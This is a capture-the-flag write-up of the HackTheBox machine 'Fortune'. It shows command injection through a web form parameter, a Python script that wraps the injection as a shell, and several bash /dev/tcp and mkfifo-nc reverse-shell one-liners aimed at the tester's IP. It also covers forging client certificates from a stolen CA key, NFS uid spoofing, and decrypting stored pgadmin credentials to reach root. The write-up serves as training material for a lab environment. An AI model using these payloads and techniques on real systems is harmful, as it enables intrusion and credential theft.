---
title: HTB: Fortune
url: https://0xdf.gitlab.io/2019/08/03/htb-fortune.html
date: 2019-08-03T13:45:00+00:00
difficulty: Insane [50]
tags: ctf, htb-fortune, hackthebox, certificate, certificate-authority, sslyze, command-injection, burp, burp-repeater, firewall, python, python-cmd, authpf, openssl, ssh, nfs, pgadmin, postgresql, credentials, sqlite, pfctl, tcpdump, htb-lacasadepapel
---

![Fortune-cover](https://0xdfimages.gitlab.io/img/fortune-cover.png)

Fortune was a different kind of insane box, focused on taking advantage things like authpf and nfs. I’ll start off using command injection to find a key and certificate that allow access to an HTTPS site. On that site, I get instructions and an ssh key to connect via authpf, which doesn’t provide a shell, but opens up new ports in the firewall. From there I can find nfs access to `/home`, which I can use with uid spoofing to get ssh access. For privesc, I’ll find credentials in pgadmin’s database which I can use to get a root shell. In Beyond Root, I’ll look the firewall configuration and why I couldn’t turn command injection into a shell.

## Box Info

| Name | [Fortune](https://hackthebox.com/machines/fortune)  [Fortune](https://hackthebox.com/machines/fortune) [Play on HackTheBox](https://hackthebox.com/machines/fortune) |
| --- | --- |
| Release Date | [09 Mar 2019](https://twitter.com/hackthebox_eu/status/1103394526788546567) |
| Retire Date | 03 Aug 2019 |
| OS | OpenBSD OpenBSD |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Fortune |
| Radar Graph | Radar chart for Fortune |
| First Blood User | 01:27:00[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 03:47:22[overcast overcast](https://app.hackthebox.com/users/9682) |
| Creator | [AuxSarge AuxSarge](https://app.hackthebox.com/users/46317) |

## Recon

### nmap

`nmap` gives 3 ports, ssh (22), http (80), and something on 443, thought the scripts don’t succeed as I might expect for a normal https service:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.127
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-09 14:04 EST
Nmap scan report for 10.10.10.127
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 6.36 seconds
root@kali# nmap -sC -sV -p 22,80,443 -oA scans/scripts 10.10.10.127                                                                                                                      
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-09 14:05 EST
Nmap scan report for 10.10.10.127
Host is up (0.019s latency).

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.79 seconds

```

Based on the `httpd` header, this box is likely OpenBSD.

### HTTPS - TCP 443

#### Site

I’ll check out the service on 443, and it does look like https, but just that on trying to load the page, it rejects me because it can’t recognize my cert:

![1552215765402](https://0xdfimages.gitlab.io/img/1552215765402.png)

Just like in [LaCasaDePapel last week](/2019/07/27/htb-lacasadepapel.html#website---tcp-443), I’ll want to keep an out for key material so I can connect to this later.

#### sslyze

Last week I used `openssl` [to pull TLS information from the site](/2019/07/27/htb-lacasadepapel.html#access-private-area). For Fortune, I’ll show a how to do it with [sslyze](https://github.com/nabla-c0d3/sslyze). I’ll install it will the instructions from the site, and then run it. The output gives all kinds of things like common SSL/TLS vulnerabilities (Heartbleed, Beast, etc) and cihper suites. For this case, it isn’t vulnerable to any of that, so I’ll just two parts of the output:

```

root@kali# sslyze --regular 10.10.10.127
...[snip]...
 CHECKING HOST(S) AVAILABILITY                                                                     
 -----------------------------
   10.10.10.127:443                       => 10.10.10.127   WARNING: Server REQUIRED client authentication, specific plugins will fail.
...[snip]...
 * Certificate Information:
     Content
       SHA1 Fingerprint:                  f5528e05f76ef7013a6ce1b9888e60aa36c4e4a6
       Common Name:                       fortune.htb
       Issuer:                            Fortune Intermediate CA
       Serial Number:                     4096
       Not Before:                        2018-10-30 01:13:42
       Not After:                         2019-11-09 01:13:42
       Signature Algorithm:               sha256
       Public Key Algorithm:              RSA
       Key Size:                          2048
       Exponent:                          65537 (0x10001)
       DNS Subject Alternative Names:     []
...[snip]...
 SCAN COMPLETED IN 2.55 S
 ------------------------

```

The site is requesting a client certificate (which I knew from above), and the site trusts a CA named Fortune Intermediate CA.

### Website - TCP 80

#### Site

Simple page offers 5 dbs, and prints what seems like a random message from the one I select:

![1552159114937](https://0xdfimages.gitlab.io/img/1552159114937.png)

![1552159125064](https://0xdfimages.gitlab.io/img/1552159125064.png)

This looks like it’s calling an [old unix program](https://en.wikipedia.org/wiki/Fortune_(Unix)), `fortune`.

#### HTTP Request

If I look at the requests being sent when I select a database, I see the POST data is just a single value for the parameter `db`:

```

POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Connection: close
Upgrade-Insecure-Requests: 1

db=zippy

```

## RCE as www-data

### Strategy

The [fortune man page](https://linux.die.net/man/6/fortune) shows the syntax to call it is to provide one or more database files `fortune db_file [db_file] ...`. I can hypothesize that the server is taking my input and calling `fortune {my input}`. I can check this by manipulating the command line. I’ll send the post to repeater, and try adding a second db:

![1564382500943](https://0xdfimages.gitlab.io/img/1564382500943.png)

It works, I get a startrek quote (since the quotes are picked at random, it may take a few submits to get one from startrek). I could also play with the weighting to pretty much guarantee a certain type of quote:

![1564382626812](https://0xdfimages.gitlab.io/img/1564382626812.png)

### Command Injection

Given that I can control the command line, I should look for command injection. It works:

```

root@kali# curl -s -X POST http://10.10.10.127/select -d "db=;id"
<!DOCTYPE html>
<html>
<head>
<title>Your fortune</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<h2>Your fortune is:</h2>
<p><pre>

For every complex problem, there is a solution that is simple, neat,
and wrong.
                -- H. L. Mencken
uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)

</pre><p>
<p>Try <a href='/'>again</a>!</p>
</body>
</html>

```

### Reverse Shell - Fail

I tried a bunch of things to get a reverse shell, but none worked:

| Command | Result |
| --- | --- |
| `bash -i >& /dev/tcp/10.10.14.10/443 0>&1` | Nothing |
| `bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'` | `bash: connect: No route to host` `bash: /dev/tcp/10.10.14.10/443: No route to host` |
| [python rev shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) | Nothing |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.10 443 >/tmp/f` | Nothing, but `/tmp/f` now exists |

I then tried just to `nc` back to myself, and still no connect. It seems like something if blocking outbound connections.

### Shell

Given that it seemed like I would be enumerating with just this command injection, I wrote a quick shell program to take commands and run them. It isn’t stateful, but allows for up arrow access to previous commands and made enumerating easier:

```

#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Terminal(Cmd):
    prompt = "fortune> "

    def default(self, args):
        resp = requests.post('http://10.10.10.127/select', data={"db": f"s;{args} 2>&1"}, proxies={"http": "http://127.0.0.1:8080"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        print(soup.find("pre").text.strip())

term = Terminal()
term.cmdloop()

```

I send in a file that doesn’t exist as the db, followed by the command I want to run, and then just grab the result from the `<pre>` tags.

```

root@kali# ./fortune_shell.py 
fortune> id
uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
fortune> pwd
/var/appsrv/fortune
fortune> ls
__pycache__
fortuned.ini
fortuned.log
fortuned.pid
fortuned.py
templates
wsgi.py

```

I can take this opportunity to check out the code for the site, and see clearly where my command injection takes place:

```

fortune> cat fortuned.py
from flask import Flask, request, render_template, abort
import os

app = Flask(__name__)

@app.route('/select', methods=['POST'])
def fortuned():

    cmd = '/usr/games/fortune '
    dbs = ['fortunes', 'fortunes2', 'recipes', 'startrek', 'zippy']
    selection = request.form['db']
    shell_cmd = cmd + selection
    result = os.popen(shell_cmd).read()     # 0xdf: injection here!!!
    return render_template('display.html', output=result)

```

## Authorization as nfsuser

### Enumeration

Looking around with my shell, I find a few interesting things. I see three user home directories:

```

fortune> ls /home
bob
charlie
nfsuser

```

I can’t access charlie, and nfsuser seems empty:

```

fortune> ls /home/charlie
ls: charlie: Permission denied

fortune> ls /home/nfsuser

```

bob has two folders:

```

fortune> ls /home/bob
ca
dba

```

In the `dba` folder, there’s an sql file about `authpf`:

```

fortune> cat /home/bob/dba/authpf.sql
CREATE TABLE authorized_keys (
        uid text,
        creator cidr,
        key text,
        PRIMARY KEY (uid,creator)
);
grant select,insert,update on authorized_keys to appsrv;
grant select on authorized_keys to bob;

```

I’ll come back to that later.

The `ca` folder has a bunch of interesting stuff, but the `intermediate` folder catches my eye thinking back to the CA from `sslyze`. I find both the certificate and the key:

```

fortune> ls /home/bob/ca/intermediate/private
fortune.htb.key.pem
intermediate.key.pem
fortune> ls /home/bob/ca/intermediate/certs
ca-chain.cert.pem
fortune.htb.cert.pem
intermediate.cert.pem

```

I’ll grab both `intermediate.key.pem` and `intermediate.cert.pem`, and bring copies back to my box.

### Create Client Certificate

I’ll use the CA cert and key to create a client certificate. First, I’ll [generate a key](https://www.openssl.org/docs/man1.0.2/man1/genrsa.html) for this certificate:

```

root@kali# openssl genrsa -out 0xdf.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
................+++++
.....................................................+++++

```

I’m using `genrsa` to create a 2048 bit key.

Next, I’ll use that key to create a certificate signing request (csr). This request will have all the information about me, and be asscoaited with the key. I’ll use the [req](https://www.openssl.org/docs/manmaster/man1/req.html) command, requesting a new csr, giving it my key and the name of the file to output:

```

root@kali# openssl req -new -key 0xdf.key -out 0xdf.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:  
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fortune
Organizational Unit Name (eg, section) []:Fortune
Common Name (e.g. server FQDN or YOUR name) []:0xdf
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

```

Next I’ll use the [x509](https://www.openssl.org/docs/man1.0.2/man1/x509.html) command to create the signed client certificate. I’ll provide it with the csr, the CA certificate, and the CA key. I’ll have it create a new serial (with the `-CAcreateserial` flag), as well as specifying the output file, and the number of days it will be valid:

```

root@kali# openssl x509 -req -in 0xdf.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out 0xdf.pem -days 1024
Signature ok
subject=C = US, ST = Some-State, O = Fortune, OU = Fortune, CN = 0xdf
Getting CA Private Key

```

Finally, I’ll use the [pkcs12](https://www.openssl.org/docs/manmaster/man1/pkcs12.html) command to combine my new client key and client certificate into a pfx file format that Firefox can import:

```

root@kali# openssl pkcs12 -export -out 0xdf.pfx -inkey 0xdf.key -in 0xdf.pem -certfile intermediate.cert.pem 
Enter Export Password:
Verifying - Enter Export Password:

```

### Access https Site

I’ll load that pfx file into Firefox, and restart Firefox. When I visit `https://10.10.10.147`, I am prompted to select a certificate. I’ll select the one I just made:

![1564524283440](https://0xdfimages.gitlab.io/img/1564524283440.png)

When I click ok, I get a site:

![1564433215249](https://0xdfimages.gitlab.io/img/1564433215249.png)

Alternatively, I can use `curl` with the `.pem` file and `.key` file:

```

root@kali# curl -k --cert 0xdf.pem --key 0xdf.key https://10.10.10.127
<!DOCTYPE html>
<html>
<head>
<title>Elevated network access</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<p>
You will need to use the local authpf service to obtain 
elevated network access. If you do not already have the appropriate
SSH key pair, then you will need to <a href='/generate'>generate</a>
one and configure your local system appropriately to proceed.
</p>
</body>
</html>

```

Either way, I get a site that tells me to use `authpf` to get “elevated network access”. It also says I can click a link to generate a SSH key pair if I don’t have one! I’ll click the link to visit `/generate`:

![1564433446014](https://0xdfimages.gitlab.io/img/1564433446014.png)

I’ll save that key to my local host, and set the permissions to 600.

### Access https Site - Alternative

When I was first solving this box, I didn’t quite understand the client certificate creation process as much as I do now after researching. And after a bunch of trial and error with building new client certificate signed by the exfiled key and certificate, I tried to just connect with the CA cert and key, and it worked. The same as before, I could use `openssl` to combine them into a `.pfx` file, or use `curl` with the two files.

```

root@kali# openssl pkcs12 -export -out intermediate.pfx -inkey intermediate.key.pem -in intermediate.cert.pem                                                                            
Enter Export Password:
Verifying - Enter Export Password:

```

Then I can load that into Firefox with the same password, and visit `https://10.10.10.127`. It pops asking about sending a client certificate:

![1564433168215](https://0xdfimages.gitlab.io/img/1564433168215.png)

I’ll make sure to select the right one, and click ok:

![1564433215249](https://0xdfimages.gitlab.io/img/1564433215249.png)

`curl` works as well:

```

root@kali# curl -k --cert intermediate.cert.pem --key intermediate.key.pem https://10.10.10.127                                                                     
<!DOCTYPE html>
<html>
<head>
<title>Elevated network access</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">                                                                                                                                                 
</head>                                                                                                                                                                                               
<body>
<p>
You will need to use the local authpf service to obtain
elevated network access. If you do not already have the appropriate
SSH key pair, then you will need to <a href='/generate'>generate</a>
one and configure your local system appropriately to proceed.
</p>
</body>
</html>

```

### authpf

#### What Is It

From the `authpf` [man page](http://www.openbsd.org/faq/pf/authpf.html):

> The authpf(8) utility is a user shell for authenticating gateways. An authenticating gateway is just like a regular network gateway (also known as a router) except that users must first authenticate themselves to it before their traffic is allowed to pass through. When a user’s shell is set to `/usr/sbin/authpf` and they log in using SSH, authpf will make the necessary changes to the active pf(4) ruleset so that the user’s traffic is passed through the filter and/or translated using NAT/redirection. Once the user logs out or their session is disconnected, authpf will remove any rules loaded for the user and kill any stateful connections the user has open. Because of this, the ability of the user to pass traffic through the gateway only exists while the user keeps their SSH session open.

So I now have a key that will connect and change the firewall to allow more access. This isn’t the first time I’ve seen `authpf` mentioned on Fortune. bob had an `authpf` sql file in his home dir. Also, when I was enumerating with RCE, I pulled `/etc/passwd`. At the bottom were the three user accounts I saw home directories for:

```

charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf

```

The names and uids will be useful later, but I’ll also notice that the shell for nfsuser is `/usr/sbin/authpf`.i

#### Connect

I’ll use `ssh` to connect as nfsuser:

```

root@kali# ssh -i ~/id_rsa_fortune_nsfuser nfsuser@10.10.10.127

Hello nfsuser. You are authenticated from host "10.10.14.10"

```

I connect, but then the shell just hangs. I can’t do anything here because I’m in `authpf`, and not a normal shell.

## Recon Again

I can now go back to recon on this box and start again, now that the firewall is more opened. I’ll run another `nmap`, and there are several more ports open:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp2 10.10.10.127
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-10 07:14 EDT
Warning: 10.10.10.127 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.127
Host is up (0.023s latency).
Not shown: 59128 filtered ports, 6400 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
613/tcp  open  hmmp-op
2049/tcp open  nfs
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 70.66 seconds

root@kali# nmap -sC -sV -p 22,80,111,443,613,2049,8081 -oA scans/scripts2 10.10.10.127                                                                              
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-10 07:11 EDT
Nmap scan report for 10.10.10.127
Host is up (0.019s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp   open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3         2049/tcp  nfs
|   100003  2,3         2049/udp  nfs
|   100005  1,3          613/tcp  mountd
|_  100005  1,3          786/udp  mountd
443/tcp  open  ssl/https?
|_ssl-date: TLS randomness does not represent time
613/tcp  open  mountd     1-3 (RPC #100005)
2049/tcp open  nfs        2-3 (RPC #100003)
8081/tcp open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: pgadmin4

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.81 seconds

```

I’ll note that nfs shows versions 2-3 That will prove useful.

### pgadmin4 - TCP 8081

Port 8081 seems to be running an http server, which returns information about [pgadmin](https://www.pgadmin.org/), a postgresql administration tool:

```

root@kali# curl 10.10.10.127:8081
<!DOCTYPE html>
<html>
<head>
<title>pgadmin4</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<p>
The pgadmin4 service is temporarily unavailable. See Charlie for details.
</p>
</body>
</html>

```

The service is currently unavailable, and there’s a note to see Charlie for details. I’ll keep that in mind.

### nsf - TCP 2049/613

When I see nfs, I can run `showmount` to see what mounts are available:

```

root@kali# showmount -e 10.10.10.127
Export list for 10.10.10.127:
/home (everyone)

```

The `/home` is not a safe thing to have, as I have access to user home directories now.

## Shell as bob or charlie

### nsf access

I’ll make a mount point and mount the nfs access:

```

root@kali# mkdir /mnt/fortune
root@kali# mount -t nfs 10.10.10.127:/home /mnt/fortune
root@kali# ls /mnt/fortune/
bob  charlie  nfsuser

```

I can also see that it is mounted as version 3, which means I can set my uid locally and nfs will respect that on Fortune:

```

root@kali# mount | grep fortune
10.10.10.127:/home on /mnt/fortune type nfs (rw,relatime,vers=3,rsize=65536,wsize=65536,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=10.10.10.127,mountvers=3,mountport=988,mountproto=udp,local_lock=none,addr=10.10.10.127)

```

### UserID Spoofing

I’m currently running as root, userid 0, on my kali box. However, that permission doesn’t seem to be translating over to Fortune:

```

root@kali# cd /mnt/fortune/charlie/
-bash: cd: /mnt/fortune/charlie/: Permission denied

```

There is likely an option, `root_squash`, that doesn’t allow root connections over nfs, and rather converts them to nobody.

Still, I can try other uids. I’ll remember from `/etc/passwd`  that charlie is 1000 and bob is 1001:

```

fortune> cat /etc/passwd | grep -e bob -e charlie
charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh

```

I already have users on my local host with those ids:

```

root@kali# cat /etc/passwd | grep -e 1000 -e 1001
ssh_user:x:1000:1000::/home/ssh_user:/bin/sh
dummy:x:1001:1001::/home/dummy:/bin/bash

```

If I switch to ssh\_user (1000), I now have access as charlie, and can grab `user.txt`:

```

root@kali# su ssh_user
ssh_user@kali$ ls /mnt/fortune/charlie/
mbox  user.txt
ssh_user@kali$ cat /mnt/fortune/charlie/user.txt 
ada0affd...

```

### Shell

I can also generate a key pair with `ssh-keygen` and add the public key to charlie’s (or bob’s) `authorized_keys` file. Then I can ssh into the box as either user:

```

root@kali# ssh -i ~/id_rsa_generated charlie@10.10.10.127
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ id
uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)

```

## Priv: charlie –> root

### Enumeration

In charlie’s homedir, in addition to `user.txt`, there’s an mbox mail file. It contains an email:

```

fortune$ cat /home/charlie/mbox
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: <bob@fortune.htb>
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for <charlie@fortune.htb>;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  <bob@fortune.htb>
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: <196699abe1fed384@fortune.htb>
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob

```

The PostgreSQL dbamin password is the same as the root password. I also know that `pgadmin` was installed, and running at some point.

### pgadmin Config

I’ll need to dig further into `pgadmin`.

I will find the source for `pgadmin` in `/usr/local/pgadmin4/pgadmin4-3.4/web`. In the main file, `pgAdmin4.py`, I see `import config`. In the same directory, I see `config.py`. In that file, I see the path to the SQLite database:

```

SQLITE_PATH = env('SQLITE_PATH') or os.path.join(DATA_DIR, 'pgadmin4.db')

```

I see `DATA_DIR` set above that line in the file:

```

if IS_WIN:
    # Use the short path on windows
    DATA_DIR = os.path.realpath(
        os.path.join(fs_short_path(env('APPDATA')), u"pgAdmin")
    )
else:
    if SERVER_MODE:
        DATA_DIR = '/var/lib/pgadmin'
    else:
        DATA_DIR = os.path.realpath(os.path.expanduser(u'~/.pgadmin/'))

```

If I look at `/var/lib/pgadmin/pgadmin4.db`, I don’t find it, but looking for a file named `pgadmin4.db`, I find it (I can’t explain why it’s in this path and not the expected one above):

```

fortune$ find /var -name pgadmin4.db 2>/dev/null 
/var/appsrv/pgadmin4/pgadmin4.db

```

### pgadmin DB

From the database, I can dump the encrypted dba password from the `server` table:

```

fortune$ sqlite3 pgadmin4.db
SQLite version 3.24.0 2018-06-04 19:24:41
Enter ".help" for usage hints.
sqlite> .tables
alembic_version              roles_users
debugger_function_arguments  server
keys                         servergroup
module_preference            setting
preference_category          user
preferences                  user_preferences
process                      version
role
sqlite> select * from server;
1|2|2|fortune|localhost|5432|postgres|dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz||prefer||||||<STORAGE_DIR>/.postgresql/postgresql.crt|<STORAGE_DIR>/.postgresql/postgresql.key|||0||||0||22||0||0|

```

I’ll pull the column headings for the `server` table, and see that the second column above (which has the value 2) is `user_id`:

```

sqlite> PRAGMA table_info(server);
0|id|INTEGER|1||1
1|user_id|INTEGER|1||0
2|servergroup_id|INTEGER|1||0
3|name|VARCHAR(128)|1||0
4|host|VARCHAR(128)|0||0
5|port|INTEGER|1||0
6|maintenance_db|VARCHAR(64)|0||0
7|username|VARCHAR(64)|1||0
8|password|VARCHAR(64)|0||0
9|role|VARCHAR(64)|0||0
...[snip]...

```

Querying the `user` table, I can see the user with id 2 is bob:

```

sqlite> select * from user;;
1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ|1|
2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|

```

I also get bob’s password hash.

### How To Decrypt

In `/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/crypto.py`, I find the `decrpyt` function:

```

def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    global padding_string

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext[AES.block_size:])

    return decrypted

```

`decrypt` takes ciphertext and a key string.

I’ll find instances where this function is used:

```

fortune$ grep -rF "decrypt(" /usr/local/pgadmin4/pgadmin4-3.4/web
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/browser/server_groups/servers/__init__.py:                decrypted_password = decrypt(manager.password, user.password)
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/crypto.py:def decrypt(ciphertext, key):
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/crypto.py:    decrypted = cipher.decrypt(ciphertext[AES.block_size:])
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/connection.py:                password = decrypt(encpass, user.password)
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/connection.py:            password = decrypt(password, user.password).decode()
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/connection.py:                password = decrypt(password, user.password).decode()
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/server_manager.py:            password = decrypt(
/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/server_manager.py:                tunnel_password = decrypt(tunnel_password, user.password)

```

In `/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/browser/server_groups/servers/__init__.py`, I can see the call:

```

decrypted_password = decrypt(manager.password, user.password)

```

If I look above, I can find where `user` is set:

```

user = User.query.filter_by(id=current_user.id).first()

```

`User` is imported at the top of the file:

```

from pgadmin.model import db, Server, ServerGroup, User

```

If I look in `pgadmin/model/__init__.py`, I see where the `User` class is defined:

```

class User(db.Model, UserMixin):
    """Define a user object"""
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(256), unique=True, nullable=False)
    password = db.Column(db.String(256))
    active = db.Column(db.Boolean(), nullable=False)
    confirmed_at = db.Column(db.DateTime())
    roles = db.relationship('Role', secondary=roles_users,
                            backref=db.backref('users', lazy='dynamic'))

```

What’s important here is that the object is based on the `user` table, and the password is the 3rd column. That means when it gets `user.password`, it is getting the string of the password hash and using it as the decryption key.

### Decrypt

So I have the encrypted string and the key. Rather than recreate the code, I’ll just download `crypto.py`:

```

root@kali# wget https://raw.githubusercontent.com/postgres/pgadmin4/e23d307c56e92453dc5ea108214c52bdb2409705/web/pgadmin/utils/crypto.py                                                             
--2019-03-11 07:38:27--  https://raw.githubusercontent.com/postgres/pgadmin4/e23d307c56e92453dc5ea108214c52bdb2409705/web/pgadmin/utils/crypto.py                                                                                      
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.248.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.248.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3233 (3.2K) [text/plain]
Saving to: ‘crypto.py’

crypto.py                                                 100%[=====================================================================================================================================>]   3.16K  --.-KB/s    in 0.003s  

2019-03-11 07:38:27 (1.13 MB/s) - ‘crypto.py’ saved [3233/3233]

```

I’ll just use a `python` shell, and import `crypto.py`. Then I run the `decrypt` function passing in:

```

root@kali# python
Python 2.7.16 (default, Apr  6 2019, 01:42:57)
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import crypto
>>> enc_dba_pass = "utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz"
>>> bobs_hash = "$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg"
>>> crypto.decrypt(enc_dba_pass, bobs_hash)
'R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!'

```

### Shell as root

With the password, I can get a shell as root from my ssh session as charlie with `su`:

```

fortune$ su
Password:
fortune# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)

```

And get `root.txt`:

```

fortune# cat /root/root.txt
335af7f0...

```

## Beyond Root - pf

### Configuration

At the start of the box, I had command execution, and tried to get a reverse shell, but failed. It looked like nothing I did would connect out. Once I got root, I checked out the firewall rules.

OpenBSD doesn’t use `iptables` as I’m used to. It uses something called `pf`, for packet filter. I can interact with it using `pfctl`. I’ll run with the `-sr` flags to show the rules:

```

fortune# pfctl -sr 
block return all
pass in quick on em0 inet proto tcp from <rfc1918> to (em0) port = 22 flags S/SA
pass in quick on em0 inet proto tcp from <rfc1918> to (em0) port = 80 flags S/SA
pass in quick on em0 inet proto tcp from <rfc1918> to (em0) port = 443 flags S/SA
pass in quick on em0 inet proto icmp from any to (em0) icmp-type echoreq code 0
pass out on egress proto tcp all flags S/SA
pass out on egress proto udp all
pass out on egress proto icmp all
block return out log proto tcp all user = 55
